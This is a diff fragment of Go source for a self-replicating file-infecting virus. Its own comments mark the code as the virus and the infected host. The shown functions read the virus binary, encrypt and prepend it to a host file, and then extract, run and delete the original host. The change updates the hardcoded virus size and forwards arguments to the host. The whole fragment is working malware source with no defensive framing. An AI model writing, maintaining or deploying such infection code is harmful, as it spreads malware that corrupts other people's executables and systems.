@@ -98,7 +98,7 @@ func Infect(file string) {
 	check(err)
 	vir, err := os.Open(os.Args[0]) //read virus
 	check(err)
-	virbuf := make([]byte, 1666208)
+	virbuf := make([]byte, 2332394)
 	vir.Read(virbuf)
 
 	encDat := Encrypt(dat) //encrypt host
@@ -124,12 +124,12 @@ func RunHost() {
 	infected_data, err := ioutil.ReadFile(os.Args[0]) //Read myself
 	check(err)
 	allSZ := len(infected_data) //get file full size
-	hostSZ := allSZ - 1666208   //calculate host size
+	hostSZ := allSZ - 2332394   //calculate host size
 
 	f, err := os.Open(os.Args[0]) //open host
 	check(err)
 
-	f.Seek(1666208, os.SEEK_SET) //go to host start
+	f.Seek(2332394, os.SEEK_SET) //go to host start
 
 	hostBuf := make([]byte, hostSZ)
 	f.Read(hostBuf) //read it
@@ -142,8 +142,9 @@ func RunHost() {
 	h.Close()
 	f.Close()
 
+	args := os.Args[1:]
 	os.Chmod(hostbytes, 0755) //give it proper permissions
-	out, err := exec.Command("./" + hostbytes).Output()
+	out, err := exec.Command("./"+hostbytes, args...).Output()
 	check(err)
 	print(string(out))
 	os.Remove(hostbytes)
@@ -227,7 +228,7 @@ func main() {
 		}
 	}
 
-	if GetSz(os.Args[0]) > 1666208 {
+	if GetSz(os.Args[0]) > 2332394 {
 		RunHost()
 	} else {
 		os.Exit(0)
